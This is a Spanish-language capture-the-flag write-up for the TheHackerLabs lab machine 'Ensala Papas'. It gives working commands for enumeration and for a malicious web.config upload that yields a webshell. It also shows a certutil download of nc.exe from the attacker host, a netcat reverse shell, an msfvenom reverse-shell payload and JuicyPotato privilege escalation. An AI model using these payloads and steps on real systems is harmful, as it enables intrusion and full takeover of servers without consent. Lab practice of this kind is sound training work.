---
title: "TheHackerLabs - Principiante : [Ensala Papas]"
date: 2024-07-02 10:00:00 +0200
categories: [CTF, Writeups, TheHackerLabs, Linux, Principiante]
tags: [CTF, Writeups, TheHackerLabs, Linux, Principiante]
image: /img/posts/CTF/ensala/logo.png
---

## Introducción

Hoy vamos a realizar el desafío de la máquina CTF llamada **[Ensala Papas](https://thehackerslabs.com/ensala-papas/)** en TheHackerLabs. Este es un reto de nivel principiante que opera bajo un sistema Linux. **Tengo un aprecio especial por esta máquina** ya que me enfrenté a muchos obstáculos durante el proceso y logré superarlos con éxito.

A lo largo de este viaje, recibí **consejos valiosos de la comunidad**, y justo cuando estaba a punto de darla por perdida, decidí darme un margen de dos días. Después de este breve descanso, me puse de nuevo con el desafío y logré resolverlo. Por eso, este writeup me hace especial ilusión compartirlo.

---

## Entorno inicial

### Escaneo de red con `arp-scan`

Para iniciar nuestro análisis, ejecutamos el siguiente comando en la terminal:

```bash
arp-scan -I enp0s17 --localnet
```

**Resultados del escaneo:**

```
192.168.1.49    08:00:27:f4:9b:0a    (Unknown)
```

Identificamos un host activo con la IP `192.168.1.49`. Procedimos a escanearlo con `nmap`.

---

## Enumeración

### Escaneo detallado con `nmap`

Utilizamos un script personalizado para escanear la IP obtenida:

```bash
sudo ./escaneo.sh 192.168.1.49
```

**Resultados:**

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 7.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds
```

El servidor HTTP ejecuta IIS 7.5, lo que podría ser vulnerable. Exploramos el puerto 80 más a fondo.

---

### Exploración con `gobuster`

Para buscar directorios y archivos ocultos, usamos el siguiente comando:

```bash
gobuster dir -u http://192.168.1.49 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x asp,aspx,html,php
```

**Resultados:**
- `/zoc.aspx` (200 OK): Un formulario de subida de archivos.
- `/Subiditosdetono/` (403 Forbidden): Directorio restringido.

Exploramos `/zoc.aspx` y descubrimos un formulario para cargar archivos.

---

### Análisis del formulario `/zoc.aspx`

El formulario permite subir archivos. Usamos `HackTricks` para investigar posibles métodos de explotación. Probamos subir un archivo `web.config` malicioso diseñado para obtener una webshell.

```xml
<?xml version="1.0"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="shell" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="cmd.exe" resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

---

### Ejecución del webshell

El archivo se subió exitosamente y conseguimos acceder a la webshell en el directorio restringido:

```bash
http://192.168.1.49/Subiditosdetono/web.config
```

Desde aquí, realizamos comandos básicos para enumerar el sistema y validamos conectividad con nuestra máquina:

```bash
ping -n 2 192.168.1.47
```

---

## Explotación inicial

### Transferencia de herramientas

Para facilitar la explotación, transferimos `nc.exe` al servidor. Usamos `certutil` para descargar el archivo desde nuestro sistema local:

```bash
certutil -split -urlcache -f http://192.168.1.47/nc.exe c:\temp\nc.exe
```

---

### Establecimiento de una reverse shell

Con `nc.exe` transferido, configuramos un listener en nuestra máquina:

```bash
nc -lnvp 443
```

Desde el servidor comprometido, ejecutamos:

```bash
c:\temp\nc.exe -e cmd 192.168.1.47 443
```

Esto nos permitió acceder al servidor como un usuario básico.

---

## Escalada de privilegios

### Preparación del entorno

Generamos un payload con `msfvenom` para usar con `JuicyPotato`:

```bash
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.47 LPORT=8899 -f exe -o shell.exe
```

Transferimos tanto el payload como `JuicyPotato.exe` al servidor.

---

### Uso de `JuicyPotato`

Ejecutamos el siguiente comando para escalar privilegios:

```bash
JuicyPotato.exe -l 443 -t * -p shell.exe -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
```

---

## Root conseguido

Finalmente, obtuvimos acceso como administrador y capturamos la flag:

```bash
c:\Users\Administrador\Desktop>type root.txt
j**34**f**3*****************************
```

---

## Conclusiones

Este CTF fue un excelente reto para practicar técnicas de enumeración y explotación en un entorno Windows. Aunque parecía sencillo al principio, las múltiples capas de seguridad lo hicieron desafiante.

**Lecciones aprendidas:**
1. La importancia de la paciencia y la perseverancia.
2. La utilidad de herramientas como `HackTricks` y `PayloadsAllTheThings`.
3. El valor de tomar descansos para volver con una mente más clara.

Espero que este writeup inspire a otros a intentar desafíos similares. **Recuerda visitar:** [Ensala Papas](https://thehackerslabs.com/ensala-papas/) para probarlo por ti mismo.
